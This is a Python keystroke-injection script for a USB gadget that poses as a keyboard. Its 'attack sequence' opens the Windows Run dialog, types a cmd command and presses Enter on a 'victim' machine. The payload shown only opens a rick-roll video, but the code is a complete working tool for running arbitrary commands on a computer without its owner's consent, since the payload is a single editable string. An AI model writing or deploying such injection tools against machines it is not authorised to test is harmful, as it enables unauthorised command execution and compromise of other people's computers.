#!/usr/bin/env python3
import time

HID_DEV = "/dev/hidg0"

# --- CONSTANTS ---
MOD_NONE = 0x00
MOD_SHIFT = 0x02
MOD_GUI = 0x08  # Windows Key
KEY_ENTER = 0x28
KEY_SPACE = 0x2C
KEY_R = 0x15

# --- THE MAPPING (The "Brain") ---
# Maps characters to (Modifier, Keycode)
# Based on Standard US QWERTY Layout
KEY_MAP = {
    ' ': (MOD_NONE, KEY_SPACE),
    # Numbers
    '1': (MOD_NONE, 0x1e), '!': (MOD_SHIFT, 0x1e),
    '2': (MOD_NONE, 0x1f), '@': (MOD_SHIFT, 0x1f),
    '3': (MOD_NONE, 0x20), '#': (MOD_SHIFT, 0x20),
    '4': (MOD_NONE, 0x21), '$': (MOD_SHIFT, 0x21),
    '5': (MOD_NONE, 0x22), '%': (MOD_SHIFT, 0x22),
    '6': (MOD_NONE, 0x23), '^': (MOD_SHIFT, 0x23),
    '7': (MOD_NONE, 0x24), '&': (MOD_SHIFT, 0x24),
    '8': (MOD_NONE, 0x25), '*': (MOD_SHIFT, 0x25),
    '9': (MOD_NONE, 0x26), '(': (MOD_SHIFT, 0x26),
    '0': (MOD_NONE, 0x27), ')': (MOD_SHIFT, 0x27),
    # Symbols
    '-': (MOD_NONE, 0x2d), '_': (MOD_SHIFT, 0x2d),
    '=': (MOD_NONE, 0x2e), '+': (MOD_SHIFT, 0x2e),
    '[': (MOD_NONE, 0x2f), '{': (MOD_SHIFT, 0x2f),
    ']': (MOD_NONE, 0x30), '}': (MOD_SHIFT, 0x30),
    '\\': (MOD_NONE, 0x31), '|': (MOD_SHIFT, 0x31),
    ';': (MOD_NONE, 0x33), ':': (MOD_SHIFT, 0x33),
    '\'': (MOD_NONE, 0x34), '"': (MOD_SHIFT, 0x34),
    '`': (MOD_NONE, 0x35), '~': (MOD_SHIFT, 0x35),
    ',': (MOD_NONE, 0x36), '<': (MOD_SHIFT, 0x36),
    '.': (MOD_NONE, 0x37), '>': (MOD_SHIFT, 0x37),
    '/': (MOD_NONE, 0x38), '?': (MOD_SHIFT, 0x38),
}

# Add a-z (Standard) and A-Z (Shifted)
for i, char in enumerate("abcdefghijklmnopqrstuvwxyz"):
    KEY_MAP[char] = (MOD_NONE, 0x04 + i)
    KEY_MAP[char.upper()] = (MOD_SHIFT, 0x04 + i)

# --- FUNCTIONS ---
def send_report(mod, code):
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([mod, 0, code, 0, 0, 0, 0, 0]))
    time.sleep(0.01) # Fast typing
    with open(HID_DEV, "wb") as f:
        f.write(bytearray([0, 0, 0, 0, 0, 0, 0, 0]))
    time.sleep(0.01)

def type_string(text):
    for char in text:
        if char in KEY_MAP:
            mod, code = KEY_MAP[char]
            send_report(mod, code)
        else:
            print(f"Skipping unknown char: {char}")

# --- ATTACK SEQUENCE ---
print("--- ATTACK STARTING ---")
time.sleep(1.5)

# 1. Open Run Dialog
print("[+] Win + R")
send_report(MOD_GUI, KEY_R)
time.sleep(0.5)

# 2. Type the command
# 'cmd /c' means 'run this command then close the black window immediately'
# 'start' tells Windows to open the default web browser
payload = "cmd /c start https://www.youtube.com/watch?v=dQw4w9WgXcQ" # rick-roll the victim

print(f"[+] Typing: {payload}")
type_string(payload)

# 3. Hit Enter
send_report(MOD_NONE, KEY_ENTER)

print("--- PAYLOAD DELIVERED ---")